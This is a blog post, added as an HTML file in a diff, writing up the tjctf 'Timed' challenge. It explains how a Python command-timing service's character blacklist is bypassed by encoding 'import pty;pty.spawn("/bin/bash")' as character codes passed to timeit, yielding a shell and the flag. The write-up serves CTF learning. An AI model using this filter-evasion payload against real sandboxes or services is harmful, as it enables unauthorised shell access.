@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <title>Cheuk&#39;s Blog: Timed - tjctf</title>
+    
+<meta name="keywords" content="terminal,ncurses,ocaml,how-to,GNOME,imagemagick,testing,spoilers,neovim,github,jekyll,installation,config,tutorial,lightning,graphics,review,compression,transparent,tokenizer,group,exercise,Huffman,updates,games,project,gstreamer,easy,i3,wallclimbing,linux,encoder,interpretor,deemo,fun,rest,assignment,computer,perl,racket,TinyBASIC,writing,challenge,movie,unity,go,cli,bits,music,c++,status,dosbox,question,programming,death,chip8,visual,plane,apps,ruby,theory,amy tan,overcome,phone,ACE,vim,decompression,arch,flask,compton,qbasic,scrabble,pygame,python,emulator,bioperl,lambda,data,assembler,ray casting,bioinformatics,ctf,decoder,plugins,procrastination,journal,writeup,school,fire,cursive,basic,editor,Xorg,headers">
+
+<meta name="description" content="This one is a cool blacklist bypass. It&#39;s pretty simple. You are presented a
+text interface asking you to enter a python command.">
+
+<meta property="og:description" content="This one is a cool blacklist bypass. It&#39;s pretty simple. You are presented a
+text interface asking you to enter a python command.">
+
+<meta property="og:url" content="https://cheuksblog.ca/2020-05-26-timed-tjctf/" />
+<meta property="og:title" content="Timed - tjctf" />
+<meta property="og:type" content="article" />
+
+    <link rel="canonical" href="https://cheuksblog.ca/2020-05-26-timed-tjctf/">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.7.0/styles/gruvbox-dark.min.css">
+    <link href="/css/main.css" rel="stylesheet" type="text/css" />
+  </head>
+  <body>
+    <div class="wrapper">
+      <nav>
+  <a href="/" class="nav-title">Cheuk&#39;s Blog</a>
+
+  <a class="nav-links" href="/">Portfolio</a>
+  <a class="nav-links" href="/archives">Posts</a>
+</nav>
+
+
+      
+<article class="post">
+    <div class="post-header">
+    <div id="post-meta" class="row">
+        <div class="col-lg-6">May 26, 2020</div>
+        
+    </div>
+    <h2>Timed - tjctf</h2>
+</div>
+<div>
+    
+    <p>This one is a cool blacklist bypass. It's pretty simple. You are presented a
+text interface asking you to enter a python command.</p><pre><code class="console">Type a command to time it!
+</code></pre><p>Trying some simple functions seem to work fine, but....</p><pre><code class="console">Type a command to time it!
+print(1)
+Runtime: 1.09672546387e-05
+
+Type a command to time it!
+import os
+Hey, no hacking!
+</code></pre><p>...there seems to be a blacklist of characters that get screened before the
+command is run. We must obfuscate it somehow. By digging around, we can see
+exactly what is in the blacklist and what isn't in the blacklist. Most
+peculiarly, <code>timeit</code> is <strong>NOT</strong> in the blacklist.</p><blockquote><p>Sidenote: it is hinted that <code>timeit</code> could be a possibility because it is
+visible in the source whenever we provide invalid python code for the program
+to execute.</p></blockquote><pre><code class="console">Type a command to time it!
+arst
+Traceback (most recent call last):
+  File "/timed.py", line 36, in &lt;module&gt;
+    time1=t.timeit(1)
+  File "/usr/lib/python2.7/timeit.py", line 202, in timeit
+    timing = self.inner(it, self.timer)
+  File "&lt;timeit-src&gt;", line 6, in inner
+    arst
+NameError: global name 'arst' is not defined
+Runtime: 0
+
+Type a command to time it!
+12.,,
+Traceback (most recent call last):
+  File "/timed.py", line 31, in &lt;module&gt;
+    t=timeit.Timer(res)
+  File "/usr/lib/python2.7/timeit.py", line 129, in __init__
+    compile(setup + '\n' + stmt, dummy_src_name, "exec")
+  File "&lt;timeit-src&gt;", line 2
+    12.,,
+        ^
+SyntaxError: invalid syntax
+</code></pre><p>We can do something like the following in order to trick the program into
+executing blacklisted commands:</p><pre><code class="python"># We want to execute the following python
+want_exec = 'import pty;pty.spawn("/bin/bash")'
+# So we obfuscate it a bit
+obfuscated = [ord(x) for x in want_exec]
+# and we can just reverse it using a join-map
+assert want_exec == ''.join(map(chr, obfuscated))
+
+# Payload:
+timeit(''.join(map(chr, [105, ...])))
+</code></pre><p>By pasting the payload into the program, we get a shell:</p><pre><code class="console">Type a command to time it!
+timeit(''.join(map(chr, [105, ...])))
+bash: /root/.bashrc: Permission denied
+nobody@c51f99923c23:/$ ls
+ls
+bin   dev  flag.txt  lib    media  opt   root  sbin  sys       tmp  var
+boot  etc  home      lib64  mnt    proc  run   srv   timed.py  usr
+nobody@c51f99923c23:/$ cat flag.txt
+cat flag.txt
+tjctf{iTs_T1m3_f0r_a_flaggg}
+</code></pre>
+</div>
+
+<div id="post-tags">
+    <b>Tags: </b>
+    
+    <a href="/python/">python</a>
+    
+    <a href="/ctf/">ctf</a>
+    
+    <a href="/writeup/">writeup</a>
+    
+</div>
+
+
+</article>
+<footer class="post-foot">
+  <span class="prev">
+  
+    <span>Prev</span>
+    <a href="/2021-04-07-lambda-angstrom2021/">lambda lambda - angstrom 2021</a>
+  
+  </span>
+  <span class="next">
+  
+    <span>Next</span>
+    <a href="/2020-05-08-gradescope-hw-exploits/">Taking advantage of output dumping for a Gradescope programming assignment</a>
+  
+  </span>
+</footer>
+
+    </div>
+
+    <script src="//code.jquery.com/jquery-1.11.0.min.js"></script>
+    <script src="/js/highlight.pack.js" type="application/javascript"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+  </body>
+</html>
